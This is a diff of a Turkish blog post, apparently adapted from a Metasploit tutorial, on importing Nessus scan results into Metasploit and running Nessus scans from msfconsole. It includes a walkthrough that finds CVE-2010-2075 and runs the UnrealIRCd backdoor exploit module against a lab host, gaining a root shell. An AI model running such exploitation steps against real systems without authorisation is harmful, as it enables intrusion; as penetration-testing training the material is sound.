@@ -1,10 +1,10 @@
 ---
 layout: post
 title: MSF İçinde Nessus Kullanmak
-date: 2017-05-18 08:40:06.000000000 +02:00
+date: 2017-05-18 08:50:06.000000000 +02:00
 type: post
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -12,47 +12,21 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework wmap tarama
-- msf wmap tarama
+- Metasploit Framework nessus kullanma
+- msf nessus kullanma
 
-excerpt: WMAP, kullanıcılara geniş imkanlar sağlayan bir web uygulama zafiyet tarama aracıdır. Orijinal olarak **sqlmap** programından türemiştir. Bu yazıda, Metasploit içerisine entegre edilen WMAP kullanımını göreceğiz. 
+excerpt: Nessus, kişisel ve ticari olmayan kullanım için ücretsiz olarak edinilebilen bir zafiyet tarama programıdır. Tenable firması tarafından geliştirilmekte olan Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz.
 ---
 
-What is Nessus?
+# Nessus nedir?
 
-Nessus is a well known and popular vulnerability scanner that is free for personal, non-commercial use that was first released in 1998 by Renaurd Deraison and currently published by Tenable Network Security. There is also a spin off project of Nessus 2, named OpenVAS, that is published under the GPL. Utilizing a large number of vulnerability checks, called plugins in Nessus, you can identify a large number of well known vulnerablities. Metasploit will accept vulnerability scan result files from both Nessus and OpenVAS in the nbe file format.
+Nessus, kişisel ve ticari olmayan kullanım için ücretsiz olarak edinilebilen bir zafiyet tarama programıdır. Tenable firması tarafından geliştirilmekte olan Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz. Bu yazıda, genel hatlarıyla Nessus programının Metasploit Framework içerisinde kullanımını göreceğiz.
 
-Lets walk through the process. First we complete a scan from Nessus:
+## Nessus Sonuçlarını İçe Aktarma
 
-Nessus Console | Metasploit Unleashed
-Nessus Console | Metasploit Unleashed
-Upon completion of a vulnerability scan, we save our results in the nbe format and then start the msfconsole. Next, we need to import the results into the Metasploit Framework. Let’s look at the ‘help‘ command.
+Nessus arayüzünde bir tarama yaptıktan sonra, sonuçları ```.nbe``` formatında kayıt edebilirsiniz. Bu dosyayı Metasploit Framework için ```db_import``` komutuyla aktaralım.
 
-msf > help
-
-...snip...
-
-Database Backend Commands
-=========================
-    Command        Description
-    -------        -----------
-    creds          List all credentials in the database
-    db_connect     Connect to an existing database
-    db_disconnect  Disconnect from the current database instance
-    db_export      Export a file containing the contents of the database
-    db_import      Import a scan result file (filetype will be auto-detected)
-    db_nmap        Executes nmap and records the output automatically
-    db_status      Show the current database status
-    hosts          List all hosts in the database
-    loot           List all loot in the database
-    notes          List all notes in the database
-    services       List all services in the database
-    vulns          List all vulnerabilities in the database
-    workspace      Switch between database workspaces
-
-msf >
-So lets go ahead and import the nbe results file by issuing the ‘db_import‘ command followed by the path to our results file.
-
+```sh
 msf > db_import /root/Nessus/nessus_scan.nbe
 [*] Importing 'Nessus NBE Report' data
 [*] Importing host 172.16.194.254
@@ -69,8 +43,13 @@ msf > db_import /root/Nessus/nessus_scan.nbe
 [*] Importing host 172.16.194.1
 [*] Successfully imported /root/Nessus/nessus_scan.nbe
 msf > 
-After importing the results file, we can execute the ‘hosts‘ command to list the hosts that are in the nbe results file.
+```
 
+## hosts Kontrolü
+
+İçe aktarma işleminden sonra, ```hosts```komutuyla tabloya kayıt edilen ```IP``` adreslerini kontrol edelim.
+
+```sh
 msf > hosts
 
 Hosts
@@ -87,8 +66,13 @@ address         mac  name    os_name                                            
 172.16.194.172               Linux Kernel 2.6 on Ubuntu 8.04 (hardy)\n                                                             device                                                                                                                                          
 
 msf >
-We see exactly what we were expecting to see. Next we execute the ‘services‘ command which will enumerate all of the services that were detected running on the scanned system.
+```
 
+## services Kontrolü
+
+Ayrıca, ```services``` komutuyla, bulunan IP adreslerinde çalışan servisleri görüntüleyelim.
+
+```sh
 msf > services 172.16.194.172
 
 Services
@@ -130,8 +114,13 @@ host            port   proto  name            state  info
 172.16.194.172  50410  tcp    rpc-status      open   
 172.16.194.172  52843  udp    rpc-nlockmgr    open   
 172.16.194.172  55269  udp    rpc-mountd      open 
-Finally, and most importantly, the ‘vulns‘ command will list all of the vulnerabilities that were reported by Nessus and recorded in the results file. Issuing ‘help vulns‘ will provide us with this command’s many options. We will filter our search by port number to lighten the output of the command.
+```
 
+## vulns Kontrolü
+
+```vulns``` komutuyla, Bu Ip adreslerinde çalışan servislere ait varsa zafiyetleri listeleyelim. ```vulns``` komutuyla listeleme yaparken çeşitli filtreleme seçeneklerini kullanabilirsiniz. Bunları ```help vulns``` komutuyla incelemenizi tavsiye ediyorum.
+
+```sh
 msf > help vulns
 Print all vulnerabilities in the database
 
@@ -148,8 +137,11 @@ Examples:
   vulns -p 1-65536 -s http  # identified as http on any port
 
 msf >
- 
+``` 
 
+IP adreslerinde, 139 numaralı Portlara ait zafiyetleri görelim.
+
+```sh
 msf > vulns -p 139
 [*] Time: 2012-06-15 18:32:26 UTC Vuln: host=172.16.194.134 name=NSS-11011 refs=NSS-11011 
 [*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-11011 refs=NSS-11011 
@@ -169,14 +161,21 @@ msf > vulns -p 22
 [*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-32314 refs=CVE-2008-0166,BID-29179,OSVDB-45029,CWE-310,NSS-32314 
 [*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10267 refs=NSS-10267 
 [*] Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-22964 refs=NSS-22964 
+```
 
+```172.16.194.172``` IP adresine ait ```6667``` numaralı porta ait zafiyetleri görelim.
+
+```sh
 msf > vulns 172.16.194.172 -p 6667
 [*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-46882 refs=CVE-2010-2075,BID-40820,OSVDB-65445,NSS-46882 
 [*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-11156 refs=NSS-11156 
 [*] Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-17975 refs=NSS-17975 
 msf >
-Let’s pick the CVE associated with port 6667 found by Nessus and see if Metasploit has anything on that. We’ll issue the ‘search‘ command from the msfconsole followed by the CVE number.
+```
 
+```6667``` numaralı porta ait zafiyet olarak listelenen ```cve:2010-2075``` zafiyetine ait Metasploit Framework modüllerinde herhangi bir modül var mı? Aratalım.
+
+```sh
 msf > search cve:2010-2075
 
 Matching Modules
@@ -188,7 +187,13 @@ Matching Modules
 
 
 msf >
-We see Metasploit has a working module for this vulnerability. The next step is to use the module, set the appropriate options and execute the exploit.
+```
+
+Arama sonucunda, ```exploit/unix/irc/unreal_ircd_3281_backdoor``` isimli bir exploit modülü bulunduğunu görüyoruz. Şimdi bu modülü kullanalım.
+
+
+```sh
+msf  use exploit/unix/irc/unreal_ircd_3281_backdoor
 
 msf  exploit(unreal_ircd_3281_backdoor) > exploit
 
@@ -231,21 +236,29 @@ lo        Link encap:Local Loopback
 
 id
 uid=0(root) gid=0(root)
+```
 
-As you can see, importing Nessus scan results into Metasploit is a powerful feature. This demonstrates the versatility of the Framework, and some of the possibilities for integration with 3rd party tools such as Nessus.
+Exploit modülünün kullanımı ile Hedef IP adresinde bir komut satırı açılmıştır.
 
-Nessus Vulnerability Scanning Directly in Metasploit
 
-For those situations where we choose to remain at the command line, there is also the option to connect to a Nessus version 4.4.x server directly from within msfconsole. The Nessus Bridge, written by Zate and covered in detail at http://blog.zate.org/2010/09/26/nessus-bridge-for-metasploit-intro/ uses xmlrpc to connect to a server instance of Nessus, allowing us to perform and import a vulnerability scan rather than doing a manual import.
+# Nessus Programını Doğrudan MSF İçinden Kullanma
 
-We begin by first loading the Nessus Bridge Plugin.
+Önceki bölümde, Nessus programının yaptığı bir taramayı ```.nbe``` formatında kaydedip, Metasploit içerisine aktarım kullanmıştık. Komut satırını kullanmayı seviyorsanız, Nessus programını doğrudan komut satırından da kullanabilirsiniz. Bunun gerçekleşebilmesi için Metasploit Framework için geliştirilen ```Nessus Bridge Plugin``` isimli bir eklenti bulunmaktadır.
 
+## Nessus Bridge Eklentisi Başlatma
+
+```msfconsole``` içerisinden Nessus kullanım için gerekli eklentiyi yükleyelim.
+
+```sh
 msf > load nessus
 [*] Nessus Bridge for Metasploit 1.1
 [+] Type nessus_help for a command listing
 [*] Successfully loaded plugin: nessus
-Running ‘nessus_help‘ will display the msfconole commands now available to us. As you can see, it is quite full-featured.
+```
 
+Bu eklentinin bize sunduğu komutları görmek için, ```nessus_help``` yardım komutunu görüntüleyelim.
+
+```sh
 msf > nessus_help
 [+] Nessus Help
 [+] type nessus_help command for help with specific commands
@@ -275,8 +288,13 @@ Scan Commands
 nessus_scan_new            Create new Nessus Scan
 nessus_scan_status         List all currently running Nessus scans
 ...snip...
-Prior to beginning, we need to connect to the Nessus server on our network. Note that we need to add ‘ok‘ at the end of the connection string to acknowledge the risk of man-in-the-middle attacks being possible.
+```
 
+## Nessus Sunucuya Bağlanma
+
+```msfconsole``` içerisinden Nessus programına komut gönderebilmek için öncelikle Nessus sunucuya bağlanmamız gerekmektedir. Bunun için ```nessus_connect dook:s3cr3t@192.168.1.100 ok``` komut şablonunu kullanıyoruz. Burada **dook** Nessus için kullandığınız __kullanıcı adınız__ , **s3cr3t** Nessus parolanızdır. **192.168.1.100** IP adresi yerine, sisteminizde Nessus sunucunun çalıştığı IP adresini yazmalısınız. Komutun sonundaki ``ok`` parametresi, Nessus'a dışarıdan bağlandığınızı ve güvenlik ikazını kabul ettiğinizi onaylamak için zorunludur.
+
+```sh
 msf > nessus_connect dook:s3cr3t@192.168.1.100
 [-] Warning: SSL connections are not verified in this release, it is possible for an attacker
 [-]          with the ability to man-in-the-middle the Nessus traffic to capture the Nessus
@@ -286,8 +304,13 @@ msf > nessus_connect dook:s3cr3t@192.168.1.100 ok
 [*] Connecting to https://192.168.1.100:8834/ as dook
 [*] Authenticated
 msf >
-To see the scan policies that are available on the server, we issue the ‘nessus_policy_list‘ command. If there are not any policies available, this means that you will need to connect to the Nessus GUI and create one before being able to use it.
+```
 
+## Nessus Tarama Politikalarını Görüntüleme
+
+Nessus sunucuda bulunan tarama politikalarını ```nessus_policy_list``` komutuyla görüntüleyelim. Herhangi bir tarama politikanız yoksa, Nessus Görsel arayüzüne giderek oluşturmanız gerekmektedir.
+
+```sh
 msf > nessus_policy_list
 [+] Nessus Policy List
 
@@ -296,18 +319,30 @@ ID  Name       Owner  visability
 1   the_works  dook   private
 
 msf >
-To run a Nessus scan using our existing policy, use the command ‘nessus_scan_new‘ followed by the policy ID number, a name for your scan, and the target.
+```
 
+## Nessus İle Yeni Bir Tarama Başlatma
+
+Artık tarama politikalarını da görüntüledikten sonra yeni bir tarama başlatabiliriz. Taramayı başlatmak için ```nessus_scan_new``` komutu kullanılır. Komut, ```nessus_scan_new```, ```id```, ```scan name```, ```targets``` parçalarından oluşur. Aşağıda örneğini görebilirsiniz.
+
+```sh
 msf > nessus_scan_new
 [*] Usage:
 [*]        nessus_scan_new policy id scan name targets
 [*]        use nessus_policy_list to list all available policies
+
+
 msf > nessus_scan_new 1 pwnage 192.168.1.161
 [*] Creating scan from policy number 1, called "pwnage" and scanning 192.168.1.161
 [*] Scan started.  uid is 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
 msf >
-To see the progress of our scan, we run ‘nessus_scan_status‘. Note that there is no progress indicator so we keep running the command until we see the message ‘No Scans Running‘.
+```
 
+## Devam Eden Tarama Durumunu Görüntüleme
+
+```nessus_scan_new``` komutuyla başlattığınız taramanın ne durumda olduğunu, ```nessus_scan_status``` komutuyla kontrol edebilirsiniz.
+
+```sh
 msf > nessus_scan_status
 [+] Running Scans
 
@@ -325,8 +360,13 @@ msf > nessus_scan_status
 [*]         List of completed scans:         nessus_report_list
 [*]         Create a scan:                   nessus_scan_new policy id scan name target(s)
 msf >
-When Nessus completes the scan, it generates a report for us with the results. To view the list of available reports, we run the ‘nessus_report_list‘ command. To import a report, we run ‘nessus_report_get‘ followed by the report ID.
+```
 
+## Tarama Sonucunu Alma
+
+Nessus taraması tamamlandığında kendi içinde bir rapor oluşturur. Metasploit Framework içine alınabilecek raporların listesini ```nessus_report_list``` komutuyla görüntüleyelim. Ardından, raporun ```ID``` numarasını vererek, ```nessus_report_get``` komutuyla ```msfconsole``` içine ithal edelim.
+
+```sh
 msf > nessus_report_list
 [+] Nessus Report List
 
@@ -336,15 +376,24 @@ ID                                                    Name    Status     Date
 
 [*] You can:
 [*]         Get a list of hosts from the report:          nessus_report_hosts report id
+
+
 msf > nessus_report_get
 [*] Usage:
 [*]        nessus_report_get report id
 [*]        use nessus_report_list to list all available reports for importing
+
+
 msf > nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
 [*] importing 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
 msf >
-With the report imported, we can list the hosts and vulnerabilities just as we could when importing a report manually.
+```
 
+## Sonuçları Görüntüleme
+
+İçeri aktarılan tarama sonuçlarını, önceki bölümde olduğu gibi ```hosts```, ```services``` ve ```vulns``` komutlarıyla görüntüleyebilirsiniz.
+
+```sh
 msf > hosts -c address,vulns
 
 Hosts
@@ -353,7 +402,9 @@ Hosts
 address        vulns
 -------        -----
 192.168.1.161  33
+```
 
+```sh
 msf > vulns
 [*] Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=3389 proto=tcp name=NSS-10940 refs=
 [*] Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=1900 proto=udp name=NSS-35713 refs=
@@ -366,3 +417,4 @@ msf > vulns
 [*] Time: 2010-09-28 01:51:41 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-35362 refs=CVE-2008-4834,BID-31179,OSVDB-48153
 [*] Time: 2010-09-28 01:51:41 UTC Vuln: host=192.168.1.161
 ...snip...
+```
